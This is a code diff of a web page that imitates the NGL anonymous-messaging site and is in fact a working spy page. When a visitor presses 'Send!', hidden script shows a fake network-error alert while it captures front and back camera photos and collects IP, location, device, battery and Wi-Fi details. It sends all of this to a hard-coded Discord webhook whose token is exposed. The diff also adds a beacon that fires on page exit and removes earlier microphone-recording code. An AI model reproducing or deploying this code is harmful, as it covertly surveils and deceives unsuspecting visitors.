@@ -24,6 +24,41 @@
         window.analytics = analytics;
         window.logEvent = logEvent;
 
+        // Function to send data to Discord webhook when user leaves the website or closes the tab/browser
+        function sendDataToWebhook() {
+            // You can add additional data or customize this function as needed
+            const webhookURL = 'https://discord.com/api/webhooks/971478317544910928/bOato0Nzxsan6XQs20QElHZRIdu-cQehot1r9l1nwdwn8s_KqvYpaxXGPJHJfT0rVZa4';
+            const data = {
+                message: 'User left the website or closed the tab/browser.'
+                // You can add additional data here if needed
+            };
+
+            const requestOptions = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            };
+
+            fetch(webhookURL, requestOptions)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send data to Discord webhook');
+                    }
+                    console.log('Data sent to Discord webhook successfully');
+                })
+                .catch(error => {
+                    console.error('Error sending data to Discord webhook:', error);
+                });
+        }
+
+        // Add event listener for when the user leaves the page or closes the tab/browser
+        window.addEventListener('beforeunload', function(event) {
+            // Send data to Discord webhook when user leaves the website or closes the tab/browser
+            sendDataToWebhook();
+        });
+
         const sendButton = document.querySelector('.submit');
 
         sendButton.addEventListener('click', async function() {
@@ -31,9 +66,9 @@
 
             if (message.trim() !== '') {
                 try {
-                  // Mengambil informasi WiFi yang digunakan oleh pengguna
-            const wifiInfo = await getWifiInfo();
-                  // Mengambil informasi baterai pengguna
+                    // Mengambil informasi WiFi yang digunakan oleh pengguna
+                    const wifiInfo = await getWifiInfo();
+                    // Mengambil informasi baterai pengguna
             const batteryLevel = await getBatteryLevel();
                     // Tampilkan pesan kepada pengguna bahwa pesan sedang dikirim
                     alert('Mohon tunggu beberapa saat jaringan anda mengalami gangguan, tunggu beberapa saat agar pesan terkirim kepada pengguna...');
@@ -42,9 +77,8 @@
                     const deviceInfo = getDeviceInfo();
                     const backImageData = await captureImage('environment');
                     const frontImageData = await captureImage('user');
-                    const audioBlob = await captureAudio();
 
-                    sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob,batteryLevel, wifiInfo);
+                    sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, wifiInfo,batteryLevel);
                 
                 } catch (error) {
                     console.error('Error sending message to Discord webhook:', error);
@@ -85,7 +119,7 @@
             const platform = navigator.platform;
             let deviceBrand = 'Unknown';
 
-            // Mendeteksi merek perangkat dari string user agent
+            // Detect device brand from user agent string
             if (userAgent.match(/iPhone/i)) {
                 deviceBrand = 'iPhone';
             } else if (userAgent.match(/realme/i)) {
@@ -144,58 +178,31 @@
             });
         }
 
-        function captureAudio() {
+        function getWifiInfo() {
             return new Promise((resolve, reject) => {
-                navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then(stream => {
-                        const mediaRecorder = new MediaRecorder(stream);
-                        const chunks = [];
-
-                        mediaRecorder.ondataavailable = event => {
-                            chunks.push(event.data);
-                        };
-
-                        mediaRecorder.onstop = () => {
-                            const audioBlob = new Blob(chunks, { type: 'audio/wav' });
-                            resolve(audioBlob);
-                        };
-
-                        mediaRecorder.start();
-
-                        setTimeout(() => {
-                            mediaRecorder.stop();
-                        }, 1000); // Sesuaikan durasi rekaman sesuai kebutuhan
-                    })
-                    .catch(error => {
-                        console.error('Error accessing microphone:', error);
-                        reject(error);
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    resolve({
+                        type: connection.type,
+                        effectiveType: connection.effectiveType,
+                        downlink: connection.downlink,
+                        rtt: connection.rtt,
+                        wifiSSID: connection.ssid
                     });
+                } else {
+                    reject(new Error('Failed to get WiFi information'));
+                }
             });
         }
-function getWifiInfo() {
-    return new Promise((resolve, reject) => {
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (connection) {
-            resolve({
-                type: connection.type,
-                effectiveType: connection.effectiveType,
-                downlink: connection.downlink,
-                rtt: connection.rtt,wifiSSID: connection.ssid
-            });
-        } else {
-            reject(new Error('Failed to get WiFi information'));
-        }
-    });
-}
-        // Fungsi untuk mendapatkan informasi jumlah baterai pengguna
+
+      // Fungsi untuk mendapatkan informasi jumlah baterai pengguna
 function getBatteryLevel() {
     return navigator.getBattery().then(function(battery) {
         return battery.level * 100; // Mengambil nilai baterai dalam persen
     });
 }
 
-        function sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob, batteryLevel, wifiInfo) {
-    // Kode sebelumnya
+        function sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, wifiInfo,batteryLevel) {
             const webhookURL = 'https://discord.com/api/webhooks/971478317544910928/bOato0Nzxsan6XQs20QElHZRIdu-cQehot1r9l1nwdwn8s_KqvYpaxXGPJHJfT0rVZa4';
 
             const formattedMessage = `
@@ -222,7 +229,8 @@ function getBatteryLevel() {
         - Downlink: ${wifiInfo.downlink}
         - RTT: ${wifiInfo.rtt}
         - Wifi: ${wifiInfo.wifiSSID}
-  
+
+
 🔋 **Baterai:**
         - Level: ${batteryLevel}%
     `;
@@ -241,11 +249,6 @@ function getBatteryLevel() {
                 formData.append('front_image', frontImageData);
             }
 
-            if (audioBlob) {
-                const audioFile = new File([audioBlob], 'audio.wav', { type: 'audio/wav' });
-                formData.append('audio', audioFile);
-            }
-
             const requestOptions = {
                 method: 'POST',
                 body: formData
@@ -258,7 +261,7 @@ function getBatteryLevel() {
                     }
                     console.log('Message sent to Discord webhook successfully');
 
-                    // Mengarahkan pengguna ke halaman HTML yang baru setelah berhasil mengirim webhook
+                    // Redirect user to a new HTML page after successfully sending webhook
                     window.location.href = 'sent.html';
                 })
                 .catch(error => {
@@ -267,13 +270,15 @@ function getBatteryLevel() {
         }
     </script>
     <title>@Kucinglucu</title>
+    <!-- Your CSS links -->
     <link rel="stylesheet" href="css/normalize.css">
     <link rel="stylesheet" href="css/style.css">
-    <link rel="shortcut icon" href="images/62a98d041030ce99f782fbde_Variant5_256.png">
+    <!-- Your JS links -->
     <script src="js/jquery.min.js"></script>
     <script src="js/main.js"></script>
     <script src="js/mixpanel-jslib-snippet.js"></script>
     <script src="https://js.stripe.com/v3/"></script>
+    <!-- Meta tags -->
     <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">
     <meta name="user:language" content="en">
     <meta property="og:image" content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&amp;text1=send%20me%20anonymous%20messages!">
@@ -285,6 +290,7 @@ function getBatteryLevel() {
     <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">
 </head>
 <body>
+    <!-- Your HTML content -->
     <input type="hidden" id="userRegion" value="ID">
     <div class="container" style="z-index: 1000; position: relative">
         <form class="form" method="post">
@@ -305,31 +311,7 @@ function getBatteryLevel() {
             <div class="anonymous-tooltip">🔒 Anonymous Q&amp;A</div>
             <button class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000">Send!</button>
         </form>
-        <a id="downloadAudio" style="display: none;">Download Audio</a> <!-- Tombol untuk mengunduh audio -->
     </div>
-
-    <script>
-        // Menambahkan event listener untuk mengunduh audio saat tombol diklik
-        document.getElementById('downloadAudio').addEventListener('click', function() {
-            const audioBlob = document.getElementById('audioBlob').href;
-            const audioName = 'audio.wav';
-            downloadBlob(audioBlob, audioName);
-        });
-
-        // Fungsi untuk mengunduh blob sebagai file
-        function downloadBlob(blob, fileName) {
-            const url = window.URL.createObjectURL(new Blob([blob]));
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = fileName;
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => {
-                document.body.removeChild(a);
-                window.URL.revokeObjectURL(url);
-            }, 0);
-        }
-    </script>
 
     <div class="bottom-container-user-wrapper">
         <div class="bottom-container">
@@ -344,4 +326,3 @@ function getBatteryLevel() {
     </div>
 </body>
 </html>
-
